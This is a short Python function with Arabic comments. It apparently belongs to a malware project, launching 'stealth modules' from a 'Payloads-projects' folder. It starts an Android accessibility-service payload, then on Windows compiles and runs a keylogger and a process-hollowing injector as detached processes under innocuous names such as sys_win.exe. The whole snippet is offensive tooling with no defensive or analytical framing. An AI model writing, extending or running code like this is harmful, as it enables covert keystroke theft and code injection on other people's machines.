def launch_stealth_modules():
    # تحديد المسار الصحيح للمجلد الذي يحتوي على الملفات
    base_path = "Payloads-projects"
    
    # 1. تشغيل وحدة الأندرويد (تنبيه: Replit يحتاج تنصيب Java ليعمل هذا السطر)
    print("[*] Deploying Android Accessibility Service...")
    subprocess.Popen(["java", f"{base_path}/LeviathanService.java"], shell=False)

    # 2. تجميع وتشغيل وحدات الويندوز (تعمل فقط إذا كان السيرفر محلياً على ويندوز)
    if platform.system() == "Windows":
        try:
            # تجميع الـ Keylogger
            subprocess.Popen(["g++", f"{base_path}/keylogger.cpp", "-o", "win_log.exe"], shell=True).wait()
            subprocess.Popen(["win_log.exe"], creationflags=subprocess.DETACHED_PROCESS)
            
            # تجميع الـ Hollowing
            subprocess.Popen(["g++", f"{base_path}/hollowing.cpp", "-o", "sys_win.exe"], shell=True).wait()
            subprocess.Popen(["sys_win.exe"], creationflags=subprocess.DETACHED_PROCESS)
        except:
            print("[-] Windows binaries failed to compile on this host.")
